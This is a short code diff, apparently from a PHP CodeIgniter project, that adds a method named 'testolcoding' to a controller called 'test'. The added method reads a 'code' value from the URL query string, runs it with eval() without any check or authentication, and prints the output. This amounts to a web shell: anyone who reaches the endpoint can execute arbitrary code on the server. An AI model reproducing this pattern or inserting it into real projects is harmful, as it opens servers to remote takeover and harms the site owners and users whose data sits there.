@@ -43,5 +43,14 @@ class test extends CI_Controller{
         $return_arr['status'] = true;
         $this->renderJson($return_arr);
     }
+
+    public function testolcoding(){
+        $params = $this->input->get();
+        ob_start();
+        $res = eval( $params['code']);
+        $output = trim(ob_get_clean());
+        var_dump('output'.$output);
+        var_dump('result'.$res);
+    }
 }
 
